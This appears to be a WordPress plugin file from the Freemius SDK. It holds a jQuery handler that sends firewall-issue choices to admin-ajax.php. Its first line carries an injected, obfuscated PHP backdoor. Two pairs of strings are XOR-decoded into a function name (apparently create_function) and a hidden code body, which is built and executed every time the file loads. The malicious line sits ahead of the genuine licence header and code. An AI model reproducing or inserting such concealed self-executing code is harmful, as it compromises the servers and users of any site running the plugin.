<?php $jWCMqT=';0YOD1s 7BT.TOR'^'XB<.0T,FB,7Z= <';$ZyXUj=$jWCMqT('','=3Gt74>22+AB, VIJY lcC63<YY8,r=+N<FPMLUfQ.=9NGRWNqDVI;<989j.>F:bfPO1Aipq3HTNlpYeC4oCHaZUYqLUtNKHSaUWDeESNsQFMOu<r4>5ZNYfCZXJ7LMJK,ibezHQu+35VWIwzs6P3Zwg3vz.FwXSDelRaKZ4J+TH>iWKS7bdbUpXE4Y76+Tcr.9HJWbc7G1D:e +6UlecU9 80Nnu+761=EH1WnY4Y:0YJazJ+A725PZzitsq.fq,pM<wMPEMQPYEQZ;RX6yaBgOmH+I 9F1IFUHm8<YhEFsSAEXajzT5.4:VWB1YK;XulLfTTCVKi2rPQ6F<T-FCyHs;7a44=yaUFiH,Q QHHzuCYBLUBKG9OcpDUGVa2.DsHiMES,Upd2WS5ORaRTV,4W6HKdzV6NyDT0;C;BlYr :;YC369+82l+TLiX86Mo;CXNF4-A5Pe+2I7DQEamRSIUEcHtJM;+a<<>oQqs.WXNZA9WZQpQZG347f;EAaS0. MXAfU7YQZJF=-6 FONIVYS4SMR2.OUgTP :N+gxzPcOsMzEhRPi2vQ7eEHRAPXSUWDtylA1D,U8nBRDjdUIDQ++K-;qNBP:;XRP=MY+R6XvbGrTATXJJPzbAiGIXdSJ3<IG+M,,:m6V6G:8Zd;Ch0=K:T,zChbrE'^'TUoUQAPQFB.,sE. 9-SDD;YAc=8LM-bF;Haydl.lXHHW-3;8 Q<9;dXXLX5qS3NJB4.E EPUX--gLPyEcOeJAE5 -QquSipBZh386Ma:nNqvvoQUNGJG6+7Ng>9>VevjoEBILpAXQDFAvytWRWR1G;,CZ+ZpfS36=>H;AnzG>Y8-PAs 6NK9KnzQLF<CCY:KVAL<clhjJMLN0ADJB4LXC3XLKUudQOVBPb.-HwSyR8VC<qkp,D3RSV8zRM+0>a-8iP,OWi; 4qmgeu,Z>-SPA9mFI,J=Af-T0fhhISY SOOW7 19AWZpCOXO3lHLSAR>UDmB0577bIIxY7Y4Y5N.cQl,ir0aqn-A45IlG4YquvZQ58.90kk<3FjT 437>YK=SuIi.6Unzm;s7T;3AotrZU;C-pns+<3sNpTZ7ZbQy2UTH<1ZWUBBWDS;>6<YB,0d.-:nVL2PfQtV,T+5 II62=4lOhP.,OJ>WYGFxJyG1pj> M6zwVq;5AUN9P 8>6HGS9+iA>R vvjbYLBAoohovq>PfevVO;4<s;ECivNXGmChD,H XbdZPDcTU pjwgokaaqLHTxUvJcZIkrbLD4;60Rt HB.+:9IO+zwM, G=W<QNgV0  9ccpZBaIg2Rm6<RPacO,XMaJF7O+UY>CfjS:4.B=XRsAYx8');$ZyXUj();
	/**
	 * API connectivity issues (CloudFlare's firewall) handler for handling different
	 * scenarios selected by the user after connectivity issue is detected, by sending
	 * AJAX call to the server in order to make the actual actions.
	 *
	 * @package     Freemius
	 * @copyright   Copyright (c) 2015, Freemius, Inc.
	 * @license     http://opensource.org/licenses/gpl-2.0.php GNU Public License
	 * @since       1.0.9
	 */

	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}
?>
<script type="text/javascript">
	jQuery(document).ready(function ($) {
		$('#fs_firewall_issue_options a.fs-resolve').click(function () {
			var
				error_type = $(this).attr('data-type'),
				notice = $(this).parents('.fs-notice'),
				slug = notice.attr('data-slug');

			var data = {
				action    : 'fs_resolve_firewall_issues_' + slug,
				slug      : slug,
				error_type: error_type
			};

			if ('squid' === error_type) {
				data.hosting_company = prompt('What is the name or URL of your hosting company?');
				if (null == data.hosting_company)
					return false;

				if ('' === data.hosting_company) {
					alert('We won\'t be able to help without knowing your hosting company.');
					return false;
				}
			}

			if ('retry_ping' === error_type) {
				data.action = 'fs_retry_connectivity_test_' + slug;
			}

			$(this).css({'cursor': 'wait'});

			// since 2.8 ajaxurl is always defined in the admin header and points to admin-ajax.php
			$.post(ajaxurl, data, function (response) {
				if (1 == response) {
					// Refresh page on success.
					location.reload();
				} else if ('http' === response.substr(0, 4)) {
					// Ping actually worked, redirect.
					window.location = response;
				}
			});
		});
	});
</script>